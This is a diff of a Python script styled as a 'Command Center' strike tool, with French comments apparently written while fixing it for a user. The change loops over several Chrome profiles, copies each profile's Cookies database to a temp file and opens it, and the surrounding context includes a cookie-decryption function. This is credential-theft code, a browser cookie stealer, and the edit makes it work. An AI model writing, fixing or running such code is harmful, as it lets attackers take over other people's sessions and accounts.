@@ -40,17 +40,19 @@ def decrypt_value(enc_value, key):
 def execute_strike():
     print(f"[*] Command Center Active. Session: {os.getlogin()}")
     
-    if not os.path.exists(CHROME_PATH):
-        print("[!] Error: Chrome path not found.")
-        return
-
-    shutil.copyfile(CHROME_PATH, TEMP_DB)
-    for profile in PROFILES:
-        chrome_db = os.path.join(BASE_CHROME_PATH, profile, "Cookies")
-        if not os.path.exists(chrome_db): continue
+    # On itère sur tes profils détectés sur ton screenshot
+    profiles = ["Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4"]
+    
+    for profile in profiles:
+        # LA CORRECTION EST ICI : On ajoute le nom du profil et le fichier 'Cookies'
+        current_chrome_db = os.path.join(BASE_CHROME_PATH, profile, "Cookies")
         
-        print(f"[*] Scanning Profile: {profile}")
-        shutil.copyfile(chrome_db, TEMP_DB)
+        if not os.path.exists(current_chrome_db):
+            continue
+            
+        print(f"[*] Scanning Node: {profile}...")
+        # Utilise current_chrome_db ici, pas BASE_CHROME_PATH
+        shutil.copyfile(current_chrome_db, TEMP_DB)
         conn = sqlite3.connect(TEMP_DB)
         cursor = conn.cursor()
     
